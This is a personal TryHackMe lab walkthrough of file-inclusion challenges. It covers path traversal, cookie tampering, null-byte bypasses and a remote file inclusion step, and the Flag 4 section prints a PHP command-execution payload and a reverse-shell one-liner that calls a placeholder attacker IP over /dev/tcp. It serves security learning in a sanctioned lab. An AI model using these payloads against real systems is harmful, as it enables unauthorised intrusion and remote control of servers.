
<!DOCTYPE html>

<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>File Inclusion &#8212; The Cyber Toolkit</title>
    
  <link href="../_static/css/theme.css" rel="stylesheet">
  <link href="../_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">

    
  <link rel="stylesheet"
    href="../_static/vendor/fontawesome/5.13.0/css/all.min.css">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
  <link rel="preload" as="font" type="font/woff2" crossorigin
    href="../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">

    
      

    
    <link rel="stylesheet" type="text/css" href="../_static/pygments.css" />
    <link rel="stylesheet" type="text/css" href="../_static/sphinx-book-theme.css?digest=c3fdc42140077d1ad13ad2f1588a4309" />
    <link rel="stylesheet" type="text/css" href="../_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../_static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="../_static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="../_static/.ipynb_checkpoints/custom-checkpoint.css" />
    <link rel="stylesheet" type="text/css" href="../_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
    <link rel="stylesheet" type="text/css" href="../_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
    
  <link rel="preload" as="script" href="../_static/js/index.be7d3bbb2ef33a8344ce.js">

    <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
    <script src="../_static/jquery.js"></script>
    <script src="../_static/underscore.js"></script>
    <script src="../_static/doctools.js"></script>
    <script src="../_static/togglebutton.js"></script>
    <script src="../_static/clipboard.min.js"></script>
    <script src="../_static/copybutton.js"></script>
    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script src="../_static/sphinx-book-theme.d59cb220de22ca1c485ebbdc042f0030.js"></script>
    <script async="async" src="https://unpkg.com/thebe@0.5.1/lib/index.js"></script>
    <script>
        const thebe_selector = ".thebe"
        const thebe_selector_input = "pre"
        const thebe_selector_output = ".output"
    </script>
    <script async="async" src="../_static/sphinx-thebe.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="Privelige Escalation" href="../Tools/PriveligeEscalation/PriveligeEscalation.html" />
    <link rel="prev" title="Jr Pen Tester Path" href="JnrPenTester.html" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="docsearch:language" content="None">
    

    <!-- Google Analytics -->
    
<script async="" src="https://www.google-analytics.com/analytics.js"></script>
<script>
                        window.ga = window.ga || function () {
                            (ga.q = ga.q || []).push(arguments) };
                        ga.l = +new Date;
                        ga('create', '305129232', 'auto');
                        ga('set', 'anonymizeIp', true);
                        ga('send', 'pageview');
                    </script>

  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    
    <div class="container-fluid" id="banner"></div>

    

    <div class="container-xl">
      <div class="row">
          
<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    
        <div class="navbar-brand-box">
    <a class="navbar-brand text-wrap" href="../index.html">
      
        <!-- `logo` is deprecated in Sphinx 4.0, so remove this when we stop supporting 3 -->
        
      
      
      <img src="../_static/logo.png" class="logo" alt="logo">
      
      
      <h1 class="site-logo" id="site-title">The Cyber Toolkit</h1>
      
    </a>
</div><form class="bd-search d-flex align-items-center" action="../search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
    <div class="bd-toc-item active">
        <ul class="nav bd-sidenav">
 <li class="toctree-l1">
  <a class="reference internal" href="../intro.html">
   The Cyber Toolkit
  </a>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  TryHackMe Rooms / Walkthrough
 </span>
</p>
<ul class="current nav bd-sidenav">
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../HoloLive/HoloLive.html">
   HoloLive
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/>
  <label for="toctree-checkbox-1">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../HoloLive/HoloLive_Task8.html">
     HoloLive Walkthrough - Task 8
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../HoloLive/HoloLive_Task9.html">
     HoloLive Walkthrough - Task 9
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../HoloLive/HoloLive_Task10.html">
     HoloLive Walkthrough - Task 10
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 current active has-children">
  <a class="reference internal" href="JnrPenTester.html">
   Jr Pen Tester Path
  </a>
  <input checked="" class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
  <label for="toctree-checkbox-2">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul class="current">
   <li class="toctree-l2 current active">
    <a class="current reference internal" href="#">
     File Inclusion
    </a>
   </li>
  </ul>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  Tools
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../Tools/PriveligeEscalation/PriveligeEscalation.html">
   Privelige Escalation
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/>
  <label for="toctree-checkbox-3">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../Tools/PriveligeEscalation/LinEnum.html">
     LinEnum
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../Tools/PriveligeEscalation/LinPeas.html">
     LinPeas
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../Tools/PriveligeEscalation/LES.html">
     Linux Exploit Suggester
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../Tools/PriveligeEscalation/Powerup.html">
     Powerup
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../Tools/BurpSuite/Burp.html">
   Burp Suite
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/>
  <label for="toctree-checkbox-4">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../Tools/BurpSuite/BurpRepeater.html">
     Burp Suite - Repeater
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="../Tools/BurpSuite/BurpIntruder.html">
     Burp Suite - Intruder
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Tools/Nmap.html">
   Nmap
  </a>
 </li>
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../Tools/Metasploit.html">
   Metasploit Framework
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/>
  <label for="toctree-checkbox-5">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul>
   <li class="toctree-l2">
    <a class="reference internal" href="../Tools/Msfvenom.html">
     Msfvenom
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Tools/CyberChef.html">
   Cyberchef
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Tools/NFS.html">
   NFS
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Tools/John.html">
   John The Ripper
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Tools/Netcat.html">
   Netcat
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Tools/GoBuster.html">
   Gobuster
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Tools/Wfuzz.html">
   WFUZZ
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Tools/Nikto.html">
   Nikto
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Tools/HashCat.html">
   Hashcat
  </a>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  Hacker Craft
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1">
  <a class="reference internal" href="../Craft/TheBasics.html">
   The Basics
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Craft/LinuxFun.html">
   Linux Fun
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Craft/WindowsFun.html">
   Windows ‘fun’ stuff
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Craft/SQLinjection.html">
   SQL Injection
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Craft/ssh.html">
   SSH
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Craft/XSS.html">
   XSS
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Craft/LFI.html">
   LFI
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Craft/UploadVulns.html">
   Upload Vulnerabilities
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Craft/DHCP.html">
   DHCP
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Craft/ShellStabalise.html">
   Stabalising a shell
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Craft/FileTransfer.html">
   File Transfer to Machines
  </a>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  The Cyber Killchain
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1 has-children">
  <a class="reference internal" href="../KillChain/Killchain_Overview.html">
   Killchain Overview
  </a>
  <input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" type="checkbox"/>
  <label for="toctree-checkbox-6">
   <i class="fas fa-chevron-down">
   </i>
  </label>
  <ul class="simple">
  </ul>
 </li>
</ul>
<p aria-level="2" class="caption" role="heading">
 <span class="caption-text">
  Non Hacking Notes
 </span>
</p>
<ul class="nav bd-sidenav">
 <li class="toctree-l1">
  <a class="reference internal" href="../Other/FormattingNotes.html">
   Formatting Notes
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../Other/ThingsToDo.html">
   Things to Do
  </a>
 </li>
</ul>

    </div>
</nav> <!-- To handle the deprecated key -->

<div class="navbar_extra_footer">
  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
</div>

</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="topbar container-xl fixed-top">
    <div class="topbar-contents row">
        <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show"></div>
        <div class="col pl-md-4 topbar-main">
            
            <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
                data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
                aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
                title="Toggle navigation" data-toggle="tooltip" data-placement="left">
                <i class="fas fa-bars"></i>
                <i class="fas fa-arrow-left"></i>
                <i class="fas fa-arrow-up"></i>
            </button>
            
            
<div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
            class="fas fa-download"></i></button>

    <div class="dropdown-buttons">
        <!-- ipynb file if we had a myst markdown file -->
        
        <!-- Download raw file -->
        <a class="dropdown-buttons" href="../_sources/JnrPenTester/FileInclusion.ipynb"><button type="button"
                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                data-placement="left">.ipynb</button></a>
        <!-- Download PDF via print -->
        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
                onclick="printPdf(this)" data-toggle="tooltip" data-placement="left">.pdf</button>
    </div>
</div>

            <!-- Source interaction buttons -->

            <!-- Full screen (wrap in <a> to have style consistency -->

<a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
        data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
        title="Fullscreen mode"><i
            class="fas fa-expand"></i></button></a>

            <!-- Launch buttons -->

        </div>

        <!-- Table of contents -->
        <div class="d-none d-md-block col-md-2 bd-toc show noprint">
            
            <div class="tocsection onthispage pt-5 pb-3">
                <i class="fas fa-list"></i> Contents
            </div>
            <nav id="bd-toc-nav" aria-label="Page">
                <ul class="visible nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#task-8-challenge">
   Task 8 Challenge
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#flag1">
     Flag1
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#flag2">
     Flag2
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#flag-3">
     Flag 3
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#flag-4-the-challenge">
   Flag 4 - The challenge
  </a>
 </li>
</ul>

            </nav>
        </div>
    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
            <!-- Table of contents that is only displayed when printing the page -->
            <div id="jb-print-docs-body" class="onlyprint">
                <h1>File Inclusion</h1>
                <!-- Table of contents -->
                <div id="print-main-content">
                    <div id="jb-print-toc">
                        
                        <div>
                            <h2> Contents </h2>
                        </div>
                        <nav aria-label="Page">
                            <ul class="visible nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#task-8-challenge">
   Task 8 Challenge
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#flag1">
     Flag1
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#flag2">
     Flag2
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#flag-3">
     Flag 3
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#flag-4-the-challenge">
   Flag 4 - The challenge
  </a>
 </li>
</ul>

                        </nav>
                    </div>
                </div>
            </div>
            
              <div>
                
  <div class="tex2jax_ignore mathjax_ignore section" id="file-inclusion">
<h1>File Inclusion<a class="headerlink" href="#file-inclusion" title="Permalink to this headline">¶</a></h1>
<div class="section" id="task-8-challenge">
<h2>Task 8 Challenge<a class="headerlink" href="#task-8-challenge" title="Permalink to this headline">¶</a></h2>
<p>I’m starting with the challenges, as the rest is already walked through in the tasks. No guidance on this one though</p>
<div class="section" id="flag1">
<h3>Flag1<a class="headerlink" href="#flag1" title="Permalink to this headline">¶</a></h3>
<p><img alt="JrPen-FileInclusion_task1.png" src="../_images/JrPen-FileInclusion_task1.png" /></p>
<p>OK, so the form is broken. If we take a quick look at the source, it’s a get request instead of a POST… smart
<img alt="JrPen-FileInclusion_GET.png" src="../_images/JrPen-FileInclusion_GET.png" /></p>
<p>If we can’t use the built in form, theres a few ways around this. The first thing that came to mind was CURL. A quick, easy way to send a request…</p>
<p>A quick google for the format and I ended up with the below command</p>
<p><img alt="JrPen-FileInclusion_Curl.png" src="../_images/JrPen-FileInclusion_Curl.png" /></p>
<ul class="simple">
<li><p>-X: The Type of Request</p></li>
<li><p>-F: A Field=Value string</p></li>
<li><p>the last string is my target (no flag)</p></li>
</ul>
<p>Those of you playing along at home may wonder why I have 4 “up-one-level” in the path. The simple answer is it was an educated guess. If the are asking for /etc/ then we’re on a linux box. Linux tends to host in /var/www/html, so 3 would be fine. One of the great things about trying to access a directory by ‘returning’ to the root directory, is that even if you overshoot how many levels up you need to go, extras just put you in the exact same spot.</p>
<p>Finally and see what we get. Scrolling to the bottom of the response, we have a code…. huh. It seems we have found our flag</p>
<p><img alt="JrPen-FileInclusion_CurlResponse.png" src="../_images/JrPen-FileInclusion_CurlResponse.png" /></p>
<p>If we had gotten it wrong, we can also see the directory passed back by the webpage. It was the default directory so 3 would have been enough.</p>
<p>The hints recommend Burp or Fixing the page source, whatever method works for you :-)</p>
<hr>
</div>
<div class="section" id="flag2">
<h3>Flag2<a class="headerlink" href="#flag2" title="Permalink to this headline">¶</a></h3>
<p>So… We are told to refresh then get this page</p>
<p><img alt="JrPen-FileInclusion_task2.png" src="../_images/JrPen-FileInclusion_task2.png" /></p>
<p>Huh… refresh then we arent allowed in… Did someone say cookies?
Lets take a look at our dev tools
<img alt="JrPen-FileInclusion_cookieBefore.png" src="../_images/JrPen-FileInclusion_cookieBefore.png" /></p>
<p>Now, guest sounds kinda boring dont you think? Lets try shake things up as an admin….</p>
<p><img alt="JrPen-FileInclusion_cookieAfter.png" src="../_images/JrPen-FileInclusion_cookieAfter.png" /></p>
<p>Close the Dev tools and refresh.
<img alt="JrPen-FileInclusion_cookieAdmin.png" src="../_images/JrPen-FileInclusion_cookieAdmin.png" /></p>
<p>Now, isnt that more interesting :-)</p>
<p>… but wait, theres more. Where’s the input? And we have some exceptions.
<img alt="JrnPen-FileInclusion_AdminFile.png" src="../_images/JrnPen-FileInclusion_AdminFile.png" /></p>
<p>It looks like that cookie might not be for an account name. It looks to be our file location… Let’s try that out…</p>
<p><img alt="JrnPen-FileInclusion_phpext.png" src="../_images/JrnPen-FileInclusion_phpext.png" /></p>
<p>It looks right, but we arent getting a file. You may notice the first exception has an error “No such file or directory”. The path has a .php added to the end. That’s not what we wanted. As we didnt add it, it likely added by the website. We’ve seen how to escape this before, by adding the null character at the end (%00). Lets give that a go.</p>
<p><img alt="JrnPen-FileInclusion_Flag2.png" src="../_images/JrnPen-FileInclusion_Flag2.png" /></p>
<p>Great! We have our flag. A good takeaway from this is “just because the cookie looks like an account name, doesnt mean it is”.</p>
<hr></div>
<div class="section" id="flag-3">
<h3>Flag 3<a class="headerlink" href="#flag-3" title="Permalink to this headline">¶</a></h3>
<p>Time for challenge 3. Looks like a nice, standard input form.</p>
<p><img alt="JnrPen-FileInclusion_Challenge3std.png" src="../_images/JnrPen-FileInclusion_Challenge3std.png" /></p>
<p>Running the standard escape gives a few bits of info</p>
<p><img alt="JnrPen-FileInclusion_Ch3Exceptions.png" src="../_images/JnrPen-FileInclusion_Ch3Exceptions.png" /></p>
<ol class="simple">
<li><p>We have the standard path, great</p></li>
<li><p>It looks like our special character are being dropped, thats annoying</p></li>
<li><p>We didnt ask for a .php file, but its looking for one anyway</p></li>
</ol>
<p>Ok, so 2 things to work around, lets try the special characters first</p>
<ul class="simple">
<li><p>….//….//….//etc//flag3 - Nope</p></li>
<li><p>../../../”etc/flag3” - Nope</p></li>
<li><p>../../../”etc/flag3/.” - Nope</p></li>
</ul>
<p>Well thats annoying… lets spin up burp and see whats going on…</p>
<p><img alt="JnrPen-FileInclusion_Ch3stdGet.png" src="../_images/JnrPen-FileInclusion_Ch3stdGet.png" /></p>
<p>its URL encoding our request as a get, and adding another / to the location.</p>
<ul class="simple">
<li><p>Yea, that didnt help…..</p></li>
</ul>
<p>Its a GET, Lets try a basic POST, not worry about the arguements, just to see if the method is allowed…</p>
<p><img alt="JnrPen-FileInclusion_Ch3stdPOST.png" src="../_images/JnrPen-FileInclusion_Ch3stdPOST.png" /></p>
<p>… What do you know. It is. Finally something ‘interesting’. Now that we know the page accepts POST messages, lets convert our message. About an hour of googling later, I’ve found that burp suite can actually convert for you… thats handy…</p>
<p><img alt="JnrPen-FileInclusion_Ch3ConvertBody.png" src="../_images/JnrPen-FileInclusion_Ch3ConvertBody.png" /></p>
<p>Would you look at that; with our post its not dropping the special chars. Nice</p>
<p><img alt="JnrPen-FileInclusion_Ch3SuccessfulPost.png" src="../_images/JnrPen-FileInclusion_Ch3SuccessfulPost.png" /></p>
<p>Thats one problem out of the way….</p>
<p>Now we can focus on the extention. In our last flag we used the NULL method, lets try that here.</p>
<p><img alt="JnrPen-FileInclusion_Ch3Flag.png" src="../_images/JnrPen-FileInclusion_Ch3Flag.png" /></p>
<p>That was easier than the first issue… Nice.</p>
<hr></div>
</div>
<div class="section" id="flag-4-the-challenge">
<h2>Flag 4 - The challenge<a class="headerlink" href="#flag-4-the-challenge" title="Permalink to this headline">¶</a></h2>
<p>OK, we have a form, looks the same as the others, and we can apply any technique.
<img alt="JrPen-FileInclusion_Playground.png" src="../_images/JrPen-FileInclusion_Playground.png" /></p>
<p>This one is harder than it looks though. While there are definately some directory traversal options, the user has been quite locked down.</p>
<ul class="simple">
<li><p>Directory Traversal is allowed</p></li>
<li><p>No rights to anything fun though, /etc/password is ‘empty’, /proc, log poisoning etc have no rights</p></li>
<li><p>Null Byte doesnt work</p></li>
</ul>
<p>Really, all the Local File Exploits are a no-go here, but who says this is local exploits only? We were introduced to RFIs in task 6.</p>
<p>The first thing we need to do is create a ‘remote’ location. In the real world you would spin up a machine with a public IP, but here we are on the VPN so can host locally. Python has a simple HTTP server which is great for us. More options can be found in the <a class="reference internal" href="../Craft/FileTransfer.html"><span class="doc std std-doc">FileTransfer</span></a> page.</p>
<p>I have made a new folder that I wish to expose. Then launch the server to host all files I have in the folder. With no arguements it is now hosted on 8000.</p>
<p><img alt="JrPen-FileInclusion_PythonServer.png" src="../_images/JrPen-FileInclusion_PythonServer.png" /></p>
<p>Now, to create a file to upload. As the form is already adding the .php extension, we can just create a php script to be executed. Save the file in the folder serving the PHP server.</p>
<blockquote>
<div><p>I picked <br>
&lt;?php echo shell_exec(“whoami”);?&gt;</p>
</div></blockquote>
<blockquote>
<div><p>A reverse shell is also an option, but a bit much effort for this challenge <br>
&lt;?php echo system(“0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/[yourIP]/[yourPort]; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196”); ?&gt;</p>
</div></blockquote>
<p>On the remote site, you can now enter your server address and file to include.</p>
<p><img alt="JrPen-FileInclusion_FirstRFI.png" src="JnrPenTester/JrPen-FileInclusion_FirstRFI.png" /></p>
<ol class="simple">
<li><p>The URL entered in the form</p></li>
<li><p>The response of the script</p></li>
<li><p>The file being served from my server</p></li>
</ol>
<p>Great! It Works! The challenge wasnt to work out the user running the webserver, it was to run the hostname command. Modify the RFI file to run the ‘hostname’ command instead and the flag is yours :-)</p>
<hr></div>
</div>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: "python"
        },
        kernelOptions: {
            kernelName: "python3",
            path: "./JnrPenTester"
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = 'python3'</script>

              </div>
              
            
                <!-- Previous / next buttons -->
<div class='prev-next-area'> 
    <a class='left-prev' id="prev-link" href="JnrPenTester.html" title="previous page">
        <i class="fas fa-angle-left"></i>
        <div class="prev-next-info">
            <p class="prev-next-subtitle">previous</p>
            <p class="prev-next-title">Jr Pen Tester Path</p>
        </div>
    </a>
    <a class='right-next' id="next-link" href="../Tools/PriveligeEscalation/PriveligeEscalation.html" title="next page">
    <div class="prev-next-info">
        <p class="prev-next-subtitle">next</p>
        <p class="prev-next-title">Privelige Escalation</p>
    </div>
    <i class="fas fa-angle-right"></i>
    </a>
</div>
            
        </div>
    </div>
    <footer class="footer">
  <p>
    
      By Paul Williams<br/>
    
        &copy; Copyright 2021.<br/>
  </p>
</footer>
</main>


      </div>
    </div>
  
  <script src="../_static/js/index.be7d3bbb2ef33a8344ce.js"></script>

  </body>
</html>